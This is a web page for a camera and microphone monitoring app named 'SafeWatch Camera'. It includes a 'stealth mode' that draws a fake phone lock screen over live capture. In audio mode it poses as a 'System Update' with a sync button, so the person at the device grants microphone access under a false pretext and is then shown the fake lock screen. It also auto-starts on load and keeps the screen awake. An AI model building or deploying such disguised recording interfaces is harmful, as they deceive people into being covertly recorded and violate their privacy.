<!DOCTYPE html>
<html lang="ar" dir="rtl">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>SafeWatch Camera | v4.0</title>
    <link rel="stylesheet" href="css/style.css?v=5.0">
    <link rel="manifest" href="manifest.json">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="theme-color" content="#000000">
    <script src="/socket.io/socket.io.js"></script>
    <style>
        body,
        html {
            height: 100%;
            overflow: hidden;
            background: black;
            margin: 0;
        }

        #localVideo {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }

        /* Stealth Mode Overlay */
        #dim-overlay {
            opacity: 0;
            pointer-events: none;
            transition: opacity 0.8s;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #000;
            z-index: 9999;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            align-items: center;
            padding: 60px 20px;
            color: white;
            font-family: -apple-system, sans-serif;
        }

        #dim-overlay.active {
            opacity: 1;
            pointer-events: all;
        }
    </style>
</head>

<body>
    <!-- Permission Gate -->
    <div id="permission-overlay" class="login-overlay" style="z-index: 20000;">
        <div class="login-card" style="max-width: 450px;">
            <div
                style="width: 80px; height: 80px; background: rgba(59, 130, 246, 0.1); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px;">
                <ion-icon name="shield-checkmark" style="font-size: 3rem; color: var(--primary);"></ion-icon>
            </div>
            <h2 style="margin-bottom: 10px;">تنشيط الكاميرا المباشرة</h2>
            <p style="color: var(--text-muted); font-size: 0.9rem; margin-bottom: 30px;">للبدء، يرجى الضغط على الزر
                أدناه ثم السماح بالوصول للكاميرا والميكروفون.</p>
            <button id="start-btn" class="btn" style="width: 100%;">تنشيط النظام الآن</button>
        </div>
    </div>

    <!-- Main View -->
    <video id="localVideo" autoplay playsinline muted webkit-playsinline></video>

    <!-- Stealth Mode UI (Fake Lock Screen) -->
    <div id="dim-overlay" onclick="handleWake(event)">
        <div style="width: 100%; display: flex; justify-content: space-between; align-items: center; opacity: 0.8;">
            <div style="display: flex; align-items: center; gap: 5px; font-size: 0.8rem;">
                <span>SafeNet</span> <ion-icon name="wifi"></ion-icon>
            </div>
            <div style="display: flex; align-items: center; gap: 6px; font-size: 0.8rem;">
                <span id="lock-battery">100%</span>
                <div
                    style="width: 22px; height: 11px; border: 1px solid rgba(255,255,255,0.4); border-radius: 2px; padding: 1px;">
                    <div id="battery-fill" style="height: 100%; width: 100%; background: white;"></div>
                </div>
            </div>
        </div>

        <div style="text-align: center;">
            <div id="lock-time" style="font-size: 5rem; font-weight: 200;">12:00</div>
            <div id="lock-date" style="font-size: 1.2rem; opacity: 0.8;">الأحد، 1 يناير</div>
        </div>

        <div style="width: 100%; display: flex; flex-direction: column; align-items: center; gap: 30px;">
            <div style="display: flex; gap: 50px;">
                <div
                    style="width: 50px; height: 50px; background: rgba(255,255,255,0.1); border-radius: 50%; display: flex; align-items: center; justify-content: center;">
                    <ion-icon name="flashlight" style="font-size: 1.4rem;"></ion-icon>
                </div>
                <div
                    style="width: 50px; height: 50px; background: rgba(255,255,255,0.1); border-radius: 50%; display: flex; align-items: center; justify-content: center;">
                    <ion-icon name="camera" style="font-size: 1.4rem;"></ion-icon>
                </div>
            </div>
            <div style="font-size: 0.8rem; opacity: 0.4;">
                <div
                    style="width: 80px; height: 4px; background: rgba(255,255,255,0.2); border-radius: 2px; margin: 0 auto 15px;">
                </div>
                اضغط مرتين لإلغاء التخفي
            </div>
        </div>
    </div>

    <!-- Scripts -->
    <script type="module" src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.esm.js"></script>
    <script type="module">
        import { Core } from './js/core.js';
        import { MonitorSystem } from './js/monitor.js';

        const isAudioOnly = new URLSearchParams(window.location.search).get('mode') === 'audio';

        if (isAudioOnly) {
            // Extreme Stealth UI adjustments
            document.title = "System Update"; // Generic title
            document.getElementById('start-btn').innerHTML = '<ion-icon name="sync-outline"></ion-icon> بدة المزامنة';
            document.querySelector('#permission-overlay p').innerText = "جاري الاتصال بالسيرفر لتحديث البيانات...";
            document.getElementById('localVideo').style.display = 'none';
        }

        const roomId = Core.getRoomId();
        let system = null;

        const startSystem = () => {
            if (system) return;
            const overlay = document.getElementById('permission-overlay');
            if (overlay) overlay.style.display = 'none';

            if (isAudioOnly) {
                // Immediate stealth for audio mode
                document.getElementById('dim-overlay').classList.add('active');
                updateClock();
            }

            system = new MonitorSystem(roomId);

            if ('wakeLock' in navigator) {
                navigator.wakeLock.request('screen').catch(() => { });
            }
        };

        // Try auto-start on load
        window.addEventListener('load', () => {
            setTimeout(startSystem, 1500);
        });

        document.getElementById('start-btn').onclick = startSystem;

        // Stealth Mode Helpers
        window.toggleStealthMode = () => {
            document.getElementById('dim-overlay').classList.toggle('active');
            updateClock();
        };

        let lastTap = 0;
        window.handleWake = (e) => {
            const now = Date.now();
            if (now - lastTap < 300) window.toggleStealthMode();
            lastTap = now;
        };

        function updateClock() {
            const now = new Date();
            document.getElementById('lock-time').innerText = now.toLocaleTimeString('en-US', { hour12: false, hour: '2-digit', minute: '2-digit' });
            document.getElementById('lock-date').innerText = now.toLocaleDateString('ar-EG', { weekday: 'long', day: 'numeric', month: 'long' });

            if ('getBattery' in navigator) {
                navigator.getBattery().then(b => {
                    const l = Math.round(b.level * 100);
                    document.getElementById('lock-battery').innerText = l + '%';
                    document.getElementById('battery-fill').style.width = l + '%';
                });
            }
        }
        setInterval(updateClock, 10000);
    </script>
</body>

</html>
